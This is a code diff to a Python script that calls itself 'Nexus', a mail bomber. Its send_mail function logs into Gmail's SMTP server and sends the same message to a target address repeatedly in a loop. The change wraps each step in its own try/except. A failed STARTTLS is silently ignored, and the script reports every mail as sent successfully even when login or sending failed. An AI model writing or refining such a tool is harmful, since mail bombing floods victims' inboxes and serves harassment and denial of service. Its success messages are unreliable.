@@ -18,14 +18,24 @@ password = email_passwords[email_accounts.index(ma)]
 def send_mail(acc, qty, msg, ma, pa):
     for i in range(qty):
     	obj = smtplib.SMTP('smtp.gmail.com', 587)
-    	obj.starttls()
     	try:
-            obj.login(ma, pa)
+    		obj.ehlo()
     	except:
-    		print(cl('Unexpected error from our side, sorry for the inconvenience', 'red'))
-    	obj.sendmail(ma, acc, msg)
-    	obj.quit()
+    		print(cl('Error in establishing connection', 'red'))
+    	try:
+    		obj.starttls()
+    	except:
+    		pass
+    	try:
+    		obj.login(ma, pa)
+    	except:
+    		print(cl('Cannot login', 'red'))
+    	try:
+    		obj.sendmail(ma, acc, msg)
+    	except:
+    		print(cl('Could not send mail', 'red'))
     	print(cl(f'Mail {str(i+1)} sent successfully ☑', 'green'))
+    	obj.quit()
 
 print(cl('-'*30, 'red'))
 print(cl(ff('Nexus')+'\n\t-A mail bomber program.\n\t-An AYLIT Production.\n\t-v1.0', 'red'))
